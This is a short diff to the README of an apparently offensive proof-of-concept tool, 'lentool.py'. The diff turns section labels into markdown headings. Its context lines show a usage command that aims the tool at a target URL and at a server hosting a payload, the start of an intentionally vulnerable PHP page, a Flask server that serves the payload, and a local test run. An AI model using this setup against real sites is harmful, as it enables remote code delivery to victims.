@@ -9,7 +9,7 @@ python3 lentool.py -t http://targetexample.com/?start -u http://myserverexample.
 --url, -u: Web server hosting the payload.
 ```
  # POC
- Vulnerable application:
+ ## Vulnerable application:
  ```php
  <?php
  
@@ -31,7 +31,7 @@ if (strlen($_GET['start']) < 5){
 
 ?>
  ```
- Flask server to host the payload:
+ ## Flask server to host the payload:
  ```python
  from flask import Flask, Response
  
@@ -44,7 +44,7 @@ def i():
 if __name__ == '__main__':
     app.run(host='0.0.0.0',port=4321)
  ```
- Run:
+ ## Run:
  ```
  python3 lentool.py -t http://127.0.0.1:1808?start -u 127.0.0.1:4321
  ```
